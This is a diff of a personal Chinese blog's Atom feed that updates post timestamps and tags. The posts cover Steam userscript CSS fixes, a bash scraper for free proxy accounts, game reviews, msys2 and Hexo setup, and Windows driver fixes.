 <ul>
@@ -412,7 +691,7 @@
     <link href="http://blog.qwerdf.com/2018/01/16/SteamWebToolsAndSteamEconomyEnhancerFix/"/>
     <id>http://blog.qwerdf.com/2018/01/16/SteamWebToolsAndSteamEconomyEnhancerFix/</id>
     <published>2018-01-16T05:04:46.000Z</published>
-    <updated>2018-01-16T06:34:34.833Z</updated>
+    <updated>2018-03-30T19:00:12.675Z</updated>
     <content type="html"><![CDATA[<p>steam常用脚本Steam Web Tools和Steam Economy Enhancer一起使用时,库存页面显示有冲突.此时仅需要将<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"><span class="class">.checkedForSend</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#366836</span><span class="important">!important</span></span></span></span>&#125;<span class="class">.itemcount</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#292929</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#FFF</span></span></span>;<span class="rule"><span class="attribute">font-weight</span>:<span class="value"><span class="number">700</span></span></span>;<span class="rule"><span class="attribute">position</span>:<span class="value">absolute</span></span>;<span class="rule"><span class="attribute">right</span>:<span class="value"><span class="number">0</span></span></span>;<span class="rule"><span class="attribute">top</span>:<span class="value"><span class="number">0</span></span></span></span>&#125;<span class="class">.swt_icon</span><span class="rules">&#123;<span class="rule"><span class="attribute">position</span>:<span class="value">absolute</span></span>;<span class="rule"><span class="attribute">top</span>:<span class="value"><span class="number">0</span></span></span>;<span class="rule"><span class="attribute">left</span>:<span class="value"><span class="number">0</span></span></span></span>&#125;<span class="class">.swt_icon-st</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#CF6A32</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#fff</span></span></span></span>&#125;<span class="class">.swt_icon-t</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#FDEC14</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#000</span></span></span></span>&#125;<span class="id">#inventory_logos</span><span class="rules">&#123;<span class="rule"><span class="attribute">display</span>:<span class="value">none</span></span></span>&#125;<span class="class">.swt_hidden</span><span class="rules">&#123;<span class="rule"><span class="attribute">display</span>:<span class="value">none</span></span></span>&#125;</span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>"</span><br></pre></td></tr></table></figure></p>
 <p>修改为<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'<span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"><span class="class">.checkedForSend</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#366836</span><span class="important">!important</span></span></span></span>&#125;<span class="class">.itemcount</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#292929</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#FFF</span></span></span>;<span class="rule"><span class="attribute">font-weight</span>:<span class="value"><span class="number">700</span></span></span>;<span class="rule"><span class="attribute">position</span>:<span class="value">absolute</span></span>;<span class="rule"><span class="attribute">right</span>:<span class="value"><span class="number">0</span></span></span>;<span class="rule"><span class="attribute">bottom</span>:<span class="value"><span class="number">0</span></span></span></span>&#125;<span class="class">.swt_icon</span><span class="rules">&#123;<span class="rule"><span class="attribute">position</span>:<span class="value">absolute</span></span>;<span class="rule"><span class="attribute">top</span>:<span class="value"><span class="number">0</span></span></span>;<span class="rule"><span class="attribute">left</span>:<span class="value"><span class="number">0</span></span></span></span>&#125;<span class="class">.swt_icon-st</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#CF6A32</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#fff</span></span></span></span>&#125;<span class="class">.swt_icon-t</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#FDEC14</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#000</span></span></span></span>&#125;<span class="id">#inventory_logos</span><span class="rules">&#123;&#125;</span><span class="class">.swt_hidden</span><span class="rules">&#123;<span class="rule"><span class="attribute">display</span>:<span class="value">none</span></span></span>&#125;</span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>'</span><br></pre></td></tr></table></figure></p>
 <p>即可</p>
@@ -421,7 +700,11 @@
     <![CDATA[<p>steam常用脚本Steam Web Tools和Steam Economy Enhancer一起使用时,库存页面显示有冲突.此时仅需要将<br><figure class="highlight html"><table><tr><td class="gutter"><pr]]>
     </summary>
     
-      <category term="blog" scheme="http://blog.qwerdf.com/tags/blog/"/>
+      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
+    
+      <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
+    
+      <category term="javascript" scheme="http://blog.qwerdf.com/tags/javascript/"/>
     
   </entry>
   
@@ -430,7 +713,7 @@
     <link href="http://blog.qwerdf.com/2017/07/20/simple-spider-with-bash/"/>
     <id>http://blog.qwerdf.com/2017/07/20/simple-spider-with-bash/</id>
     <published>2017-07-20T14:31:46.000Z</published>
-    <updated>2017-07-20T17:20:52.552Z</updated>
+    <updated>2018-03-30T18:59:16.469Z</updated>
     <content type="html"><![CDATA[<p>对于我这种买不起vps的穷逼来说,免费$$不失为一个很好的解决方案.然而大部分在飞机场里的免费$$都是隔一段时间变更一下端口和密码.</p>
 <p>爬虫什么的用py做的比较多一点,然而在路由器上那点可怜的空间并不足以装上py.遂查了资料上了shell的爬虫.<br><a id="more"></a><br>多话不说.</p>
 <pre><code>wget -t <span class="number">1</span> -T <span class="number">5</span> -q -O /tmp/auto_change_ss_xz https:<span class="comment">//xsjs.yhyhd.org/free-ss/</span>
@@ -455,7 +738,9 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     
     </summary>
     
-      <category term="Misc" scheme="http://blog.qwerdf.com/tags/Misc/"/>
+      <category term="linux" scheme="http://blog.qwerdf.com/tags/linux/"/>
+    
+      <category term="shell" scheme="http://blog.qwerdf.com/tags/shell/"/>
     
   </entry>
   
@@ -464,7 +749,7 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     <link href="http://blog.qwerdf.com/2017/07/19/Socxel-Pixel-Soccer/"/>
     <id>http://blog.qwerdf.com/2017/07/19/Socxel-Pixel-Soccer/</id>
     <published>2017-07-19T06:41:11.000Z</published>
-    <updated>2018-01-16T06:30:47.577Z</updated>
+    <updated>2018-03-30T19:00:26.851Z</updated>
     <content type="html"><![CDATA[<p>今天随机到的游戏是Socxel | Pixel Soccer</p>
 <p><iframe src="https://store.steampowered.com/widget/586190/" style="border:none;height:190px;width:100%;max-width:646px;"></iframe><br>开发商是 BUG-Studio 😄 这名字好啊.<br><a id="more"></a></p>
 <h2 id="0x01_简单游玩">0x01 简单游玩</h2><p>游戏支持最大4人同时在一台电脑上游戏.</p>
@@ -485,6 +770,8 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     
     </summary>
     
+      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
+    
       <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
     
   </entry>
@@ -494,7 +781,7 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     <link href="http://blog.qwerdf.com/2017/07/17/The-Next-Door/"/>
     <id>http://blog.qwerdf.com/2017/07/17/The-Next-Door/</id>
     <published>2017-07-16T16:35:48.000Z</published>
-    <updated>2017-07-17T17:55:44.498Z</updated>
+    <updated>2018-03-30T19:00:43.901Z</updated>
     <content type="html"><![CDATA[<p>今天随机到的游戏是”The Next Door”.</p>
 <p><iframe src="https://store.steampowered.com/widget/447850/" style="border:none;height:190px;width:100%;max-width:646px;"></iframe><br>不不不,不是你想的那个意♂思,和”Boy♂Next♂Door”的那个一点关系都没有.此游戏是一个融合了宗教元素的正常向解密游戏,只是我第一次玩的时候直白的xx画面吓得我赶紧把游戏关掉了而已.<br><a id="more"></a></p>
 <blockquote>
@@ -551,6 +838,8 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     
     </summary>
     
+      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
+    
       <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
     
   </entry>
@@ -560,7 +849,7 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     <link href="http://blog.qwerdf.com/2017/07/16/play-random-game/"/>
     <id>http://blog.qwerdf.com/2017/07/16/play-random-game/</id>
     <published>2017-07-16T00:22:07.000Z</published>
-    <updated>2017-07-17T17:52:14.152Z</updated>
+    <updated>2018-03-30T19:00:35.979Z</updated>
     <content type="html"><![CDATA[<p>当今年steam夏季促销完成后,随着身体的一阵抖动,顿时感觉索然无味了起来.</p>
 <p>看着库里各种慈善包/免费领取的喜加一,想着这破博客的更新频率,我决定搞一个一个喜加一小游戏的游玩记录,玩玩各种”多半差评”的神奇游戏.</p>
 <p><del>使用<a href="https://steamdb.info/calculator/" target="_blank" rel="external">steamdb.info</a>页面下方提供的”i’m feeling lucky”来实现.</del><br><a id="more"></a><br>然而并不行,随机的只是在几个游戏中随机…</p>
@@ -573,6 +862,8 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     
     </summary>
     
+      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
+    
       <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
     
   </entry>
@@ -582,7 +873,7 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     <link href="http://blog.qwerdf.com/2017/07/15/configure-msys2/"/>
     <id>http://blog.qwerdf.com/2017/07/15/configure-msys2/</id>
     <published>2017-07-15T13:40:26.000Z</published>
-    <updated>2017-07-17T17:55:26.517Z</updated>
+    <updated>2018-03-30T18:59:10.389Z</updated>
     <content type="html"><![CDATA[<p>对于我这个linux伪粉来说,Windows下的cmd真的难用.在对比了多种同类型的工具(Gow,cygwin等)后,我选择了msys2.</p>
 <h2 id="安装">安装</h2><p>国内镜像<br><a href="http://mirrors.ustc.edu.cn/msys2/distrib/" target="_blank" rel="external">http://mirrors.ustc.edu.cn/msys2/distrib/</a><br>官方源<br><a href="http://repo.msys2.org/distrib/" target="_blank" rel="external">http://repo.msys2.org/distrib/</a><br><a id="more"></a></p>
 <h2 id="配置镜像以加速下载安装">配置镜像以加速下载安装</h2><p>于 /etc/pacman.d/mirrorlist.mingw32 文件开头添加：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server = <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/msys2/mingw/i686</span></span><br></pre></td></tr></table></figure></p>
@@ -604,7 +895,11 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     
     </summary>
     
-      <category term="blog" scheme="http://blog.qwerdf.com/tags/blog/"/>
+      <category term="linux" scheme="http://blog.qwerdf.com/tags/linux/"/>
+    
+      <category term="shell" scheme="http://blog.qwerdf.com/tags/shell/"/>
+    
+      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
     
   </entry>
   
@@ -630,7 +925,7 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     <link href="http://blog.qwerdf.com/2016/12/04/vs2017-rc-preview/"/>
     <id>http://blog.qwerdf.com/2016/12/04/vs2017-rc-preview/</id>
     <published>2016-12-04T11:07:28.000Z</published>
-    <updated>2017-07-17T17:55:13.275Z</updated>
+    <updated>2018-03-30T19:01:13.105Z</updated>
     <content type="html"><![CDATA[<p>早几日听说vs2017 Rc已经可以<a href="https://www.visualstudio.com/vs/visual-studio-2017-rc/" target="_blank" rel="external">下载</a>了，今日下载了下来玩了下。</p>
 <h2 id="默认全部在线安装">默认全部在线安装</h2><p><img src="/uploads/2016-12-04_1.png" alt="一个在线安装的安装程序" title="全新的在线安装的安装程序"><br>我已经开始了下载，并准备做好去蹲坑的准备,结果我刚拿上了纸就听到了下载完成的提示声音。<br><img src="/uploads/2016-12-04_2.png" alt="837 kb" title="大小仅仅有837 kb"><br><a id="more"></a></p>
 <h2 id="新的安装界面和选择组件方式">新的安装界面和选择组件方式</h2><p>感觉vs2017外在改变最大的就是这个安装界面了，曾经有这么一个说法：vs是非常庞大(亦或者是臃肿?)的，不仅仅是他的功能强大，还有他强大的占用空间。有时候我们仅仅需要使用其来进行一个方向的开发，但是vs其默认安装总是安装一些我们一般并不需要的功能。这一点在2017中有了极大改善。新版安装界面比之前我用过的几个版本相比简直就是两个软件，改变了在我眼中vs一贯臃肿的看法。<br><img src="/uploads/2016-12-04_6.png" alt="默认的分组" title="默认的分组"><br><img src="/uploads/2016-12-04_4.png" alt="安装时下载的界面与速度" title="安装中..."><br>速度还是能看的，至少比android studio好多了，我安装的时候能把带宽跑满。</p>
@@ -644,7 +939,9 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     
     </summary>
     
-      <category term="Misc" scheme="http://blog.qwerdf.com/tags/Misc/"/>
+      <category term="VisualStudio" scheme="http://blog.qwerdf.com/tags/VisualStudio/"/>
+    
+      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
     
   </entry>
   
@@ -653,7 +950,7 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     <link href="http://blog.qwerdf.com/2016/02/04/WAN-miniport/"/>
     <id>http://blog.qwerdf.com/2016/02/04/WAN-miniport/</id>
     <published>2016-02-04T04:58:09.000Z</published>
-    <updated>2016-12-08T16:54:21.054Z</updated>
+    <updated>2018-03-30T19:01:22.106Z</updated>
     <content type="html"><![CDATA[<p>在硬件管理器中出现了’WAN_Miniport（*）’，这六个理论上应该是 <del>隐藏的，</del> 没有错误的，但是有时候就会莫名其妙的出现好几个 WAN Miniport (IPv6 L2TP Network_Monitor PPPOE PPTP SSTP)，出现的原因很多，不过我见过的最多的就是xxx加速器/校园宽带客户端引起的。</p>
 <p>修复方法:<br>1.打开设备管理器，右键WAN_Miniport，选择更新驱动。<br>2.选择下面那个”浏览我的计算机xxxxxxx”<br>3.点下面那个”兼容设备”<br>4.勾掉”显示xxx”的复选框<br>5.左边选”Microsoft”，右边选”Microsoft KM-TEST Loopback Adapter“或者”Generic Mobile Broadband Adapter“<br>6.确定，完成。然后右键WAN_Miniport，卸载。<br>7.重复以上步骤，直到将所有WAN_Miniport都做一遍。<br>8.重启电脑。<br>9.打开设备管理器，扫描硬件。<br>10.完成</p>
 <p>或者</p>
@@ -665,6 +962,8 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     
       <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
     
+      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
+    
   </entry>
   
   <entry>
@@ -672,7 +971,7 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     <link href="http://blog.qwerdf.com/2016/01/13/win10-update-tools/"/>
     <id>http://blog.qwerdf.com/2016/01/13/win10-update-tools/</id>
     <published>2016-01-13T10:53:20.000Z</published>
-    <updated>2016-01-13T11:53:20.000Z</updated>
+    <updated>2018-03-30T19:01:39.521Z</updated>
     <content type="html"><![CDATA[<p>一次偶然发现使得我找到了<a href="http://download.microsoft.com/download/F/2/2/F22D5FDB-59CD-4275-8C95-1BE17BF70B21/wushowhide.diagcab" target="_blank" rel="external">wushowhide.diagcab</a>这个工具，他可以使得win10实现win7/8/8.1的wuapp.exe的隐藏更新的功能，此外也可以显示可选更新。win10那反人类的自动更新就不说什么了，更可气的是可选更新的驱动也不能自己安装更新，所以我每次都是查看可选更新后在设备管理器中找半天，然后右键更新驱动。而且有些设备更新驱动前后名字会变！这让我更菊酸乳疼了…</p>
 <p>现在我发现了”<a href="http://forum.ru-board.com/topic.cgi?forum=5&amp;topic=48142#2" target="_blank" rel="external">Windows Update MiniTool</a>”……可以方便的安装可选补丁了……还有其他一些对于更新的功能可用，比如设置自动更新方式(手动/自动/关闭等)……</p>
 ]]></content>
@@ -682,6 +981,8 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     
       <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
     
+      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
+    
   </entry>
   
   <entry>
@@ -689,13 +990,14 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     <link href="http://blog.qwerdf.com/2015/12/05/fix-insyde-airplane/"/>
     <id>http://blog.qwerdf.com/2015/12/05/fix-insyde-airplane/</id>
     <published>2015-12-04T20:23:10.000Z</published>
-    <updated>2017-07-15T13:38:26.397Z</updated>
+    <updated>2018-03-30T19:07:29.682Z</updated>
     <content type="html"><![CDATA[<p>设备管理器中Insyde Airplane Mode HID Mini-Driver有感叹号，硬件id为ACPI\VEN_PNP&amp;DEV_C000</p>
 <p>在<a href="http://answers.microsoft.com/ru-ru/windows/forum/windows8_1-hardware/%D1%81%D0%BE%D0%B2%D0%BC%D0%B5%D1%81%D1%82%D0%B8/7812d6a2-1cc6-4912-8344-8635b5356983?auth=1" target="_blank" rel="external">这里</a>找到解决问题的方案。</p>
 <p>导入注册表<br>    <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">;fix error code 10 (insyde airplane mode hid mini-driver) </span><br><span class="line"></span><br><span class="line"><span class="special">[</span>HKEY_LOCAL_MACHINE<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Services</span><span class="command">\AirplaneModeHid</span><span class="command">\Parameters</span><span class="special">]</span></span><br><span class="line">"ECRAMBASE"=dword:ff700100</span><br></pre></td></tr></table></figure></p>
 <p>仔细看了看应该是这个驱动的安装程序的锅…</p>
 <p>此文章基于以下驱动版本完成:1.4.0.3</p>
 <p>最新更新的1.4.0.4(签名日期2017-01-19)并未解决这个bug</p>
+<p><em>2018-03-31更新</em><br>1.4.0.8(签名日期2017-06-28)已解决此问题 😏</p>
 ]]></content>
     <summary type="html">
     <![CDATA[<p>设备管理器中Insyde Airplane Mode HID Mini-Driver有感叹号，硬件id为ACPI\VEN_PNP&amp;DEV_C000</p>
@@ -704,6 +1006,8 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     
       <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
     
+      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
+    
   </entry>
   
   <entry>
@@ -711,22 +1015,23 @@ ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p
     <link href="http://blog.qwerdf.com/2015/11/18/hexo-blog/"/>
     <id>http://blog.qwerdf.com/2015/11/18/hexo-blog/</id>
     <published>2015-11-17T20:23:10.000Z</published>
-    <updated>2015-11-17T21:23:10.000Z</updated>
+    <updated>2018-03-30T19:13:14.761Z</updated>
     <content type="html"><![CDATA[<p>简单说一说我是怎么搭建这个博客的吧<br>由于hexo是基于node.js的，所以需要先安装node.js<br>由于我是架设在github.io上的，所以我们需要git(还支持heroku/rsync/openshift)</p>
 <h2 id="安装node-js">安装node.js</h2><pre><code><span class="comment"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/joyent/node.git</span><br><span class="line">git checkout v0.<span class="number">12.7</span>-release</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure></span>
 </code></pre><p>若提示命令不存在，则<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">where</span> node</span><br><span class="line">ln <span class="operator">-s</span> 原位置 错误提示的位置</span><br></pre></td></tr></table></figure></p>
 <a id="more"></a>
 <h2 id="hexo的安装">hexo的安装</h2><p>新建了个目录<br>./blog/<br>在目录中<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo</span><br><span class="line">hexo init</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure></p>
 <p>这时访问<em><a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a></em>应该就可以看到你的博客了</p>
-<h2 id="github的推送设置">github的推送设置</h2><p>首先安装组件<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git</span><br></pre></td></tr></table></figure></p>
-<p>然后设置git仓库信息<br>    <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line"><span class="attribute">type</span>: git</span><br><span class="line"><span class="attribute">repo</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:<span class="attribute">XXX</span>:XXX.github.io.git</span><br><span class="line"><span class="attribute">branch</span>: master</span><br><span class="line"><span class="attribute">message</span>: update</span><br></pre></td></tr></table></figure></p>
-<p>这样就可以用<strong>hexo d</strong>来推送到github了(其实本质就是推送./public/的所有文件到github)</p>
-<h2 id="域名绑定:">域名绑定:</h2><p>暂时是直接<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> blog.qwerdf.com &gt;./blog/public/CNAME</span><br></pre></td></tr></table></figure></p>
+<h2 id="github的推送设置">github的推送设置</h2><p>首先安装组件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git</span><br></pre></td></tr></table></figure></p>
+<p>然后设置git仓库信息<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line"><span class="attribute">type</span>: git</span><br><span class="line"><span class="attribute">repo</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:<span class="attribute">XXX</span>:XXX.github.io.git</span><br><span class="line"><span class="attribute">branch</span>: master</span><br><span class="line"><span class="attribute">message</span>: update</span><br></pre></td></tr></table></figure></p>
+<p>这样就可以用<strong>hexo d</strong>来推送到github了(其实本质就是<!--2018-03-31修改--> <del>推送./public/的所有文件</del><strong>复制./public/的文件到./.deploy_git/并推送</strong>到github)</p>
+<h2 id="域名绑定:">域名绑定:</h2><p>暂时是直接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> blog.qwerdf.com &gt;./blog/public/CNAME</span><br></pre></td></tr></table></figure></p>
 <p>然后设置A记录到github</p>
-<h2 id="平时怎么用?">平时怎么用?</h2><pre><code><span class="comment"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">"标题"</span></span><br><span class="line">vim ./blog/<span class="built_in">source</span>/_posts/标题.md</span><br></pre></td></tr></table></figure></span>
-</code></pre><p>然后<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure></p>
-<h2 id="常用hexo命令">常用hexo命令</h2><pre><code><span class="comment"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo s --debug</span><br><span class="line">hexo clean&amp;&amp;hexo g&amp;&amp;hexo g&amp;&amp;hexo d</span><br></pre></td></tr></table></figure></span>
-</code></pre><p>使用两次<strong>hexo g</strong>是因为有时生成的主页<a href="https://github.com/iissnan/hexo-theme-next/issues/482" target="_blank" rel="external">有问题</a>,首页仅显示一篇文章。</p>
+<h2 id="平时怎么用?">平时怎么用?</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">"标题"</span></span><br><span class="line">vim ./blog/<span class="built_in">source</span>/_posts/标题.md</span><br></pre></td></tr></table></figure>
+<p>然后</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+<h2 id="常用hexo命令">常用hexo命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo s --debug</span><br><span class="line">hexo clean&amp;&amp;hexo g&amp;&amp;hexo g&amp;&amp;hexo d</span><br></pre></td></tr></table></figure>
+<p>使用两次<strong>hexo g</strong>是因为有时生成的主页<a href="https://github.com/iissnan/hexo-theme-next/issues/482" target="_blank" rel="external">有问题</a>,首页仅显示一篇文章。</p>
 <p>最后表示终于<strong>有时间</strong>来干这事了</p>
 ]]></content>
     <summary type="html">
